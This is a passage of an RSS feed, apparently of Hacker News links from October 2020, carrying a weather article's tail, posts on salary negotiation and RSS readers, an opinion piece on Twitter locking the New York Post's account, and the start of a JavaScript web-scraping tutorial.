<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png-nggid0520149-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast" width="648" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20648%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-temperature-forecast.png-nggid0520149-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The forecast is not looking any better. The pressure pattern has now actually reversed, with lower pressure over the Arctic. But this will change the airflow direction, just bringing warmer air from another source region. The first image shows the pressure anomalies next weekend. The second image shows the wind direction and temperature anomalies, revealing a large scale warmer air transport into the Siberian Arctic.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png" data-image-id="20166" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png-nggid0520166-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-pressure-forecast.png-nggid0520166-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png" data-image-id="20165" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png-nggid0520165-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-heatwave-forecast-1-1.png-nggid0520165-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But of course, this does not mean that +20°C …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/">https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/</a></em></p>]]>
            </description>
            <link>https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24900778</guid>
            <pubDate>Mon, 26 Oct 2020 20:11:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What to Say When You're Asked for Your Salary History]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 126 (<a href="https://news.ycombinator.com/item?id=24900382">thread link</a>) | @cushychicken
<br/>
October 26, 2020 | http://cushychicken.github.io/what-to-say-when-asked-salary-history/ | <a href="https://web.archive.org/web/*/http://cushychicken.github.io/what-to-say-when-asked-salary-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>TL;DR: “I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p><p>Reddit has been awash with posts of people getting asked for their salary history while job hunting. These posts are popping up on all sorts of subreddits. I’ve seen folks write about it in /r/personalfinance, /r/engineering, and even a bit in /r/ECE. There has been <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">a reasonable amount of ink spilled on salary negotiation online</a>, and nearly all of the advice agrees: <em>absolutely do not disclose your salary history to a prospective employer.</em> The anchoring effect of disclosing what you’re paid now naturally ties a follow-on offer to that salary.</p><p>Sorry, I slipped into manager-speak there. Let me rephrase that, in plain English. Disclosing your salary can turn a potential double digit raise when changing jobs to a few percent raise. You could leave thousands, or even <em>tens</em> of thousands of dollars on the table.</p><p>At the time of this writing, it’s still completely legal for a prospective employer to ask for salary history in <a href="https://www.hrdive.com/news/salary-history-ban-states-list/516662/">over half of the states in the USA</a>. I’m fortunate enough to live in Massachusetts, where asking for salary history has been illegal since 2018. In theory, this question isn’t a problem for me any more. In reality, it’s just changed shapes. Like a nasty cold, the question has just mutated into a new form. Instead of asking: “What is your current salary?”, prospective employers instead ask “What’s your <em>expectation</em> around salary?”</p><p>This is completely legal, but if you’re not cagey about it, you could cheerfully volunteer too much information about yourself. No law is broken if you say: “Well, I currently make <em>X dollars per year</em>, so I’d expect that plus <em>arbitrary percentage raise</em>.” Make no mistake: once you’ve given a number, it’s all over. A recruiter only hears the salary you volunteered to them. The clearest symptom of this is receiving job offers of your current salary, plus $5k or 5%.</p><p>(<strong>Note:</strong> When I say “recruiter” here, I’m referring to a recruiter or other HR professional working in-house at a company. This advice doesn’t really apply to recruiting and placement agencies. Since agency fees are based on a percentage of your salary upon getting hired, the incentives are aligned for them to ask for more money on your behalf. When you make more, they make more. Indeed, agency recruiters can be valuable information brokers. I’ve had agency recruiters tell me, completely voluntarily, that they’ve been trying to fill the position you’re discussing for six months. That’s <em>extraordinary</em> leverage for a qualified candidate.)</p><p>This potentially leaves you with a <em>boatload</em> of money on the table. Suppose, for a moment, that your skillset is one that this company desperately needs. As a result, your skillset is likely delivering way more value to that prospective employer at the margin. This means it’s a good idea for them to <em>pay you more money</em> to do your thing for them. By telling them what you get paid now, you peg the start of negotiations to that number, and give them a <em>huge discount</em> on your <em>very valuable</em> services.</p><p>Enough rambling about negotiating, and on to some practical advice! I’ve found a great turnabout phrase for being asked your salary history, or your salary expectations. Here’s what I’ve got:</p><blockquote><p>“I’m still trying to establish whether this role is a good fit for me. Why? What is this role worth to your company?”</p></blockquote><p>This is an excellent response, for three reasons.</p><ol><li>It offers no information <em>at all</em> about your current compensation.</li><li>It puts the person who asked you at an informational disadvantage. It shows that your counterparty is getting closer to a “yes”. Prioritizing good mutual fit in your response telegraphs to them that you are not convinced yet. This is a better negotiating position for you: making them work to convince you gives you <em>leverage.</em></li><li>It frequently yields a response in the form of the salary range that the employer is working with. I suspect this is out of a combination of surprise at being asked, and wanting to help make a good impression with you, the candidate, after learning that they haven’t convinced you to join yet.</li></ol><p>Got any other hot tips and tricks for salary negotiation? I’d love to hear them.</p><p>Also - that link I included above to Patrick McKenzie’s <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">blog post on salary negotiation</a>? Go read it. It’s excellent, and it <em>will</em> make you more money.</p></div></div>]]>
            </description>
            <link>http://cushychicken.github.io/what-to-say-when-asked-salary-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24900382</guid>
            <pubDate>Mon, 26 Oct 2020 19:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unexpected, Useless, and Urgent, or What RSS Gets Right]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 57 (<a href="https://news.ycombinator.com/item?id=24899256">thread link</a>) | @whatrocks
<br/>
October 26, 2020 | https://www.charlieharrington.com/unexpected-useless-and-urgent | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/unexpected-useless-and-urgent">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4>Or, What RSS Gets Right</h4>
<p>Abraham Lincoln once said, "<a href="https://en.wikipedia.org/wiki/Marshall_McLuhan">The medium is the message</a>. And San Francisco summers are cold af."</p>
<p>Putting that aside, I've been thinking a lot (uh-oh) about why I like opening up my RSS reader app so much. And I'm not <em>just</em> talking about its looks, even though it's super cute (I'm using the free, open-source, and all-around neato <a href="https://ranchero.com/netnewswire/">NetNewsWire</a> for my RSS needs).</p>
<p>No, I'm talkin' about them RSS <em>feels</em>.</p>
<p>Why does using opening my RSS inbox feel so much better than typing in gmail.com or tapping the iMessages icon or, heavens forbid, opening up Twitter?</p>
<p>With my sweet-sweet RSS, there's no anxiety. There's no guilt. In our time-tracking Screen Time home screen widget era, there's almost a baccanalian decadance to sifting through an RSS inbox, like watching honey drip from one of those wooden combs in a cereal commercial. Or -- back when we were allowed -- going to the library and reading the newspaper from those weird wooden dowels.</p>
<p>It should go without saying that this feeling does not extend to the other inboxen in my life. And I'd like to understand why -- and see if I can do anything about it.</p>
<h2>A framework for messages</h2>
<p>Butchering some data pipeline terms, let's define an inbox (e.g. email, social media, text messages, RSS, phone calls) as a sink for messages from various data providers, where these messages wait for human-in-the-loop processing (in this case, you).</p>
<p>O! Ye of little time! How are you meant to evaluate the "importance" of a given message? Let's explore that across two vectors: (1) prior awareness of the message's sender and (2) usefulessness of the message contents.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a1792/msggrid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="grid" title="grid" src="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a6d36/msggrid.png" srcset="https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/222b7/msggrid.png 163w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/ff46a/msggrid.png 325w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a6d36/msggrid.png 650w,
https://www.charlieharrington.com/static/40108f71e98124d2ba54690789f9cb9e/a1792/msggrid.png 780w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>The sweet-spot is that upper row: useful messages from both "people we know" and "people we don't know." Whereas if you're in the bottom row, you're gonna have a bad time: useless messages are never... useful.</p>
<h4>Filtering on sender</h4>
<p>The bottom right quadrant is easy to visualize: robo-calls about your non-existent car's expired warranty, social media ads, junk mailers in your meatspace mailbox. </p>
<p>You might think, perhaps, that we can use the "Expected Sender" vs "Unexpected Sender" filter to avoid this quadrant. In fact, this is what Apple allows you to do with the new <a href="https://support.apple.com/en-us/HT207099#:~:text=To%20turn%20on%20Silence%20Unknown,in%20your%20recent%20calls%20list.">Silence Unknown Callers</a> feature in iOS 14 (which doesn't actually prevent the calls, but immediately sends unknown calls to the dead-letter queue that is your voicemailbox).</p>
<p>The problem with this blunt approach of dead-letter queueing the right column is that you're going to miss the serendipity of the upper right quadrant: calls from unexpected sources with useful information. Given <a href="https://www.charlieharrington.com/colon-cancer">my recent cancer diagnosis</a>, I've had tons of important, useful calls from unknown numbers every single day, from doctors and the like -- calls that I want to triage quickly. Sending all calls from unknown numbers straight to voicemail would just be yet another inbox to maintain. Worse, I might miss something important in the upper right quadrant.</p>
<p>A lighter touch approach here is to auto-classify your messages into buckets based on sender. Gmail now does this with their "Primary", "Social", and "Promotion" tabs. Everything's still "in your inbox", but now you can usually just "Select all" on that Promotion tab and safely send those messages straight to the netherworld.</p>
<p>The bottom left quadrant is where your unique lifeforce is slowly chipped away, doomscrolling through your high school classmates' life updates or, gasp, political views. Don't get me wrong -- I really enjoy Instagram and it makes me happy to see people I know doing cool, cute stuff. But I know it can get real bad in this quadrant real quick. Unfollowing and/or muting is key here.</p>
<h4>Filtering on content</h4>
<p>Okay, so, if filtering on sender alone doesn't work, can we use the message contents to figure out if a given message is going to be useful?</p>
<p>We're now talking about <em>pre-processing</em> the messages in our queues.</p>
<p>In the days of future past, you might have employed a staffer to "sort through your office mailbox" to do this. How very Don Draper of you. But in today's era of secure password managers and 2FA, we ideally don't have <em>that many</em> other people in our digital inboxes. The inbox providers are aware of this, and they're starting to provide some tools to help here -- as long as you're okay with them "reading" your messages.</p>
<p>Gmail, for example, has gotten pretty darn good at spam detection. They're "reading your emails" and dropping the bad ones into your "spam folder" dead-letter queue. Maybe, once in a blue moon, they false-positive something that you have to go spelunking into that elephant graveyard to find. But I'm never annoyed by this, because when I see absolute garbage that they've blocked for me day-in and day-out, I'm hashtag grateful again.</p>
<p>This approach, however, isn't possible with all mediums. There's no way to pre-filter on content for an incoming phone-call, for example.</p>
<p>And the tradeoff in pre-filtering on content is, of course, privacy. </p>
<p>If you're down for your inbox provider to "scan" your messages, then they can potentially start to do some smart stuff, like "bubbling up" useful messages or getting rid of bottom row crud.</p>
<p>But, more likely than not, they're also reading them for another purpose.</p>
<h4>The cost of free</h4>
<p>Many of these inbox platforms are free (e.g. social media, Gmail), and someone's gotta pay to keep that spam algorithm ticking. And that someone is you.</p>
<p>Most ads are squarely in the bottom right quadrant. "Good" ads -- I'm talking about those Instagram candles you keep converting on -- are upper right quadrant. The platforms do their darndest to make sure their ads are as upper-right as possible, but they can't guarantee that. YouTube keeps asking me my age because it's genuinely confused as to why my viewing habits fluctuate between watching someone clean old Apple II and VIC-20 computers and the latest Super Mario 3 speed-runs. </p>
<p>And, c'mon, I'd rather just not ever see ads in the first place.</p>
<p>Okay, tough guy. Are you willing to pay for an ad-free inbox then?</p>
<p>Maybe? Ugh. Yes, there's a bunch of new players in the space who are emphasizing privacy and going ad-free. But am I going to willingly add yet another recurring subscription to my life? The Mandalorian is about to come back, and I'm already bracing for the impending Disney+ subscription. </p>
<p>I'll come back to this, because our analysis is still missing two important features.</p>
<h2>A framework for inboxen</h2>
<p>So, far we've only explored the features of an individual message -- not the nature of an inbox itself.</p>
<p>Regardless of an individual message's usefuless or your prior awareness of its sender, an inbox has two other important features that contribute to our mental well-being: (1) typical message volume and (2) expected urgency of triage.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/2e195/inboxgrid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="inbox" title="inbox" src="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/a6d36/inboxgrid.png" srcset="https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/222b7/inboxgrid.png 163w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/ff46a/inboxgrid.png 325w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/a6d36/inboxgrid.png 650w,
https://www.charlieharrington.com/static/ed577922c604b352cc74374b10cd9443/2e195/inboxgrid.png 782w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>The message volume thing is straightforward. Some platforms have a never-ending feed of messages that you can "enjoy," others not so much.</p>
<p>At the same time, each inbox medium connotes a inherent sense of urgency. <strong>The medium is the madness</strong>, if you will. No matter what the message says or who sends it, there's a differentiated inbox-level "urgency punch" to your lizard brain whenever any single message (spam or not) comes flying in.</p>
<p>Let's be more specific with some typical inboxes in our lives:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="inbox overlay" title="inbox overlay" src="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/a6d36/inboxoverlay.png" srcset="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/222b7/inboxoverlay.png 163w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/ff46a/inboxoverlay.png 325w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/a6d36/inboxoverlay.png 650w,
https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png 736w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>Phone calls are just about as "urgent" as it gets. Prior to iOS 14, phone calls used to interrupt whatever you were doing, taking up your iPhone's entire screen real estate. Doesn't get more urgent-y than that! Luckily, calls are relatively sparse compared to text messages, which you still need to respond to, but you can "put them on ice" for days at a time with a high-degree of cultural acceptance.</p>
<p>Social media messages are legion in terms of volume. And, while they're not especially urgent from an innate message-level perspective, the platforms do their darndest to "notify" you of "engagement opportunities" to keep you locked-in, so these inboxes fall in the semi-urgent category in my book.</p>
<p>Onto RSS -- my beautiful, dark, twisted RSS. There's truly zero urgency here and relatively few messages (writing blog posts is time-consuming!). Moreover, returning to our message evaluation framework, an RSS inbox only contains messages from known senders, since you've explicitly had to add their RSS feeds to your feed-roll. And, since you've likely done that because you expect to value the contents of their messages, you're likely living in the upper left quadrant in RSS-land, enjoying that drizzled honey and those weird-newspaper rolls.</p>
<p>Email is the real challenge-tunity here.</p>
<h3>Stuck in the Middle With You</h3>
<p>Email is caught in the middle of all these features, both message-level and inbox-level. Anyone can email you at any time with any message, so there's a ton of it, and any message may be useful and/or urgent. That's mostly a good thing, and probably our RFC-writing forerunners wanted it that way.</p>
<p>Thus, we check our email, prodigiously, every single day. All day long. While we're pooping, while we're Zooming, while we're doing any old thing.</p>
<p>Perhaps this is a lens on why newsletters are making a comeback. Email readers are a "captive audience," because we cannot avoid triaging our email inboxes. As long as publishers keep their newsletters top-row-level useful, we'll keep Substacking them. Certainly, the chances of me reading an email newsletter are greater than they would be if I had to visit individual blogs. However, I think my ideal for premium content would be paid RSS feeds, rather than email newsletters, because I want to keep my email inbox clean as possible to aid in my triaging. In fact, this is what many podcasts are now doing (since podcasts are just noisy RSS feeds).</p>
<p>OK, enough about content-monetization (have I mentioned I have a free newsletter below?). How can we make our email inbox <em>feel</em> better? Is it possible to make email feel as good as RSS?</p>
<p>First, we should establish principles-slash-goals for each quadrant in our Conjoined Box of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.charlieharrington.com/unexpected-useless-and-urgent">https://www.charlieharrington.com/unexpected-useless-and-urgent</a></em></p>]]>
            </description>
            <link>https://www.charlieharrington.com/unexpected-useless-and-urgent</link>
            <guid isPermaLink="false">hacker-news-small-sites-24899256</guid>
            <pubDate>Mon, 26 Oct 2020 18:18:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Twitter still hasn't unlocked the New York Post's account]]>
            </title>
            <description>
<![CDATA[
Score 623 | Comments 695 (<a href="https://news.ycombinator.com/item?id=24899186">thread link</a>) | @dsaavy
<br/>
October 26, 2020 | https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/ | <a href="https://web.archive.org/web/*/https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<div>
<div>
<p><strong>Related Article: <a href="https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/" target="_blank" rel="noreferrer noopener">What could polls be missing for this election?</a></strong></p>



<p><em>Disclaimer: I’m a registered voter with no party affiliation. I have a personal interest in tracking major news networks such as CNN, Fox News, Breitbart, the New York Times, and other outlets who publish misleading information since 2008. Twitter is a recent example of a large, influential medium that has now subjectively interfered with information flow to the public.</em></p>



<p>It has been over 10 days since the famous <a href="https://nypost.com/2020/10/14/hunter-biden-emails-show-leveraging-connections-with-dad-to-boost-burisma-pay/" target="_blank" rel="noreferrer noopener">New York Post story</a> discussing Hunter Biden’s activities with the Ukranian energy firm Burisma. Twitter reacted by locking the New York Post’s Twitter account from any activity, citing they were trying to prevent the spread of hacked information. Twitter CEO Jack Dorsey admits <a href="https://variety.com/2020/digital/news/twitter-ceo-nypost-block-wrong-hacked-materials-policy-1234807399/" target="_blank" rel="noreferrer noopener">blocking the story was a mistake</a> and ended up reallowing the sharing of the story on Twitter.</p>



<h3>Then one must ask, <em>why is the New York Post’s Twitter account still locked?</em></h3>



<p>If the decision was reversed, why isn’t the New York Post’s account unlocked? Why isn’t the New York Times account locked due to releasing Trump’s tax returns that were clearly stolen or “hacked”? Especially after the New York Times declined to share their evidence? Here’s a quote from the NYT article where they decline to share:</p>



<blockquote><p>“…Alan Garten, a lawyer for the Trump Organization, said that “most, if not all, of the facts appear to be inaccurate” and requested the documents on which they were based. After The Times declined to provide the records, in order to protect its sources…”</p><cite>https://www.nytimes.com/interactive/2020/09/27/us/donald-trump-taxes.html</cite></blockquote>



<p>So no records have been released “in order to protect sources”, which isn’t an explanation as to why the actual documents haven’t been published. You can publish tax returns without exposing your sources (for an example, look at <a href="https://wikileaks.org/" target="_blank" rel="noreferrer noopener">all of the WikiLeaks releases</a> over time). Ironically, by publishing the tax returns, you’ll force the hand of Trump to actually release his returns. Instead, all we have is the NYT claiming to have records that they won’t show and have obtained without permission.<strong> So why is the New York Post account locked and the NYT account not?</strong> </p>



<h3>A speculation</h3>



<p>Maybe the answer lies in Twitter’s rules and policies, which <a href="https://help.twitter.com/en/rules-and-policies/public-interest" target="_blank" rel="noreferrer noopener">give plenty of wiggle room</a> by utilizing “exceptions” that they alone determine is best for the public interest. Apparently unverified and unreleased tax returns are important for the public interest, but direct evidence of high-ranking US politician’s family member <a href="https://twitter.com/TrumpWarRoom/status/1196831901597806599?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1196831901597806599%7Ctwgr%5Eshare_3%2Ccontainerclick_1&amp;ref_url=https%3A%2F%2Fwww.breitbart.com%2Fpolitics%2F2019%2F11%2F19%2Fbackfire-vindman-admits-hunter-biden-seemed-unqualified-for-burisma-role%2F" target="_blank" rel="noreferrer noopener">receiving a highly paid position without prior credentials</a> is not of concern to the American public. </p>



<p>Maybe it turns out that Twitter is in fact biased? Considering it’s difficult, if not impossible for a human being to truly be entirely objective, Twitter’s review units are undoubtedly biased themselves since they’re made up of humans. Should there be insights into who makes up the committees that Twitter uses to review posts and their potential biases? Either way, the main question is; why are they subjectively trying to change the flow of information to the American public?</p>



<p>You’ll have to come to your own conclusion on that. </p>



<h3>To be transparent, this is my opinion.</h3>



<p>Any institution (private or public) with the power to influence outcomes of anything at scale, are incentivized to take a side. Since humans make up these institutions, they are inherently biased, no matter how hard they try to be unbiased. The resulting bias from the institution’s parts eventually come through as the bias of the whole institution. It’s inevitable and unavoidable, and this is what we’re seeing on Twitter’s decision to lock the New York Post’s account but not the New York Times.</p>



<p>The New York Post should be able to post their own articles without limitation unless other media outlets are restricted as well (such as BuzzFeed news). Unless every single news article is researched by a transparent committee with their justification on blocking/allowing it, one side will always benefit. </p>
</div>



<div>


	<div data-blog-id="177716820">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	</div>
</div>



<hr>



<p>Usually I write about data stuff, but sometimes I write articles like these. Subscribe if you want to get notifications of new articles!</p>



	<div data-blog-id="177716820">
		<div>
			
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24899186</guid>
            <pubDate>Mon, 26 Oct 2020 18:12:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Scraping with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 174 | Comments 87 (<a href="https://news.ycombinator.com/item?id=24898016">thread link</a>) | @paulpro
<br/>
October 26, 2020 | https://qoob.cc/web-scraping/ | <a href="https://web.archive.org/web/*/https://qoob.cc/web-scraping/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure>
    <span>
      <a href="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/627f4/main.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="WALL-E holding logos of node and javascript in his hands" title="Brief overview of what we gonna do today" src="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/80e3c/main.jpg" srcset="https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/4ec73/main.jpg 180w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/158ba/main.jpg 360w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/80e3c/main.jpg 720w,
https://qoob.cc/static/74b01920d4766fe5d1c0c86608c00255/627f4/main.jpg 810w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Brief overview of what we gonna do today</figcaption>
  </figure>
<p>If you’ll try to google “web scraping tutorial” you’ll get a bunch of tech articles on the subject that tells you how to achieve the result using python. The toolkit is pretty standard for these posts: python 3 (hopefully not second) as an engine, requests library for fetching, and Beautiful Soup 4 (which is 6 years old) for web parsing.</p>
<p><em>I’ve also seen few articles where they teach you how to parse HTML content with regular expressions, spoiler: <a href="https://stackoverflow.com/a/1732454/7668392">don’t do this</a>.</em>
</p><figure>
    <span>
      <a href="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/966c1/web-scraping-google.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Google results for 'web scraping tutorial'" title="Google results for 'web scraping tutorial'" src="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/37523/web-scraping-google.png" srcset="https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/e9ff0/web-scraping-google.png 180w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/f21e7/web-scraping-google.png 360w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/37523/web-scraping-google.png 720w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/302a4/web-scraping-google.png 1080w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/07a9c/web-scraping-google.png 1440w,
https://qoob.cc/static/acdc8a75ad0fbec61fe5615cd9e19339/966c1/web-scraping-google.png 1694w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Google results for 'web scraping tutorial'</figcaption>
  </figure>
<p>The problem is that I’ve seen articles like this 5 years ago and this stack hasn’t mostly changed. And more importantly, the solution is not native to javascript developers. If you would like to use technologies you are more familiar with, like ES2020, node, and browser APIs you will miss the direct guidance.</p>
<p>I’ve tried to fill the spot and create ‘the missing doc’.</p>
<h2>Overview</h2>
<blockquote>
<h4>Check if data is available in request</h4>
<p>Before you will start to do any of the programming, always check for the easiest available way. In our case, it would be a direct network request for data.</p>
<p>Open developer tools - F12 in most browsers - then switch to the <code>Network</code> tab and reload the page</p>
<p>If data is not baked in the HTML like it is in half of the modern web applications, there is a good chance that you don’t need to scrape and parse at all.
</p><figure>
    <span>
      <a href="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/5b503/9gag-trending.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Response of browser network request to 9gag'" title="Here 9gag is providing us all the post data in convenient format" src="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/37523/9gag-trending.png" srcset="https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/e9ff0/9gag-trending.png 180w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/f21e7/9gag-trending.png 360w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/37523/9gag-trending.png 720w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/302a4/9gag-trending.png 1080w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/07a9c/9gag-trending.png 1440w,
https://qoob.cc/static/1ae3ed4b114b1c6189a95f21fe3e13d5/5b503/9gag-trending.png 1976w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Here 9gag is providing us all the post data in convenient format</figcaption>
  </figure>
</blockquote>
<p>If you are not so lucky and still need to do the scraping, here is the general overview of the process:</p>
<ol>
<li>fetch the page with the required data</li>
<li>extract the data from the page markup to some in-language structure (Object, Array, Set)</li>
<li>process the data: filter it, transform it to your needs, prepare it for the future usage</li>
<li>save the data: write it to the database or dump it to the filesystem</li>
</ol>
